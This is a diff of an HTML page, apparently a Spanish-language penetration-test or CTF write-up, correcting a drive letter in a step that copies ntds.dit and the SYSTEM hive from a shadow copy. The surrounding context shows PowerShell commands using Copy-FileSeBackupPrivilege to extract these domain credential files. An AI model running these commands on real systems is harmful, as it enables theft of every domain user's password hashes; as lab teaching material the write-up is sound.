@@ -1233,7 +1233,7 @@ PS C:\ProgramData> </span><span class="am">Import-Module</span><span class="p"> 
 PS C:\ProgramData></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Ahora copiamos los archivos <code class="language-plaintext highlighter-rouge">ntds.dit</code> que contiene los <code class="language-plaintext highlighter-rouge">hashes</code> de todos los usuarios del dominio y <code class="language-plaintext highlighter-rouge">SYSTEM</code> de la copia creada accediendo desde la unidad <code class="language-plaintext highlighter-rouge">Z:</code></p>
+<p class="plain-text">Ahora copiamos los archivos <code class="language-plaintext highlighter-rouge">ntds.dit</code> que contiene los <code class="language-plaintext highlighter-rouge">hashes</code> de todos los usuarios del dominio y <code class="language-plaintext highlighter-rouge">SYSTEM</code> de la copia creada accediendo desde la unidad <code class="language-plaintext highlighter-rouge">X:</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">PS C:\ProgramData> </span><span class="am">Copy-FileSeBackupPrivilege </span><span class="p">X:\Windows\NTDS\ntds.dit ntds.dit
 PS C:\ProgramData> </span><span class="am">Copy-FileSeBackupPrivilege </span><span class="p">X:\Windows\System32\Config\SYSTEM SYSTEM  </span>
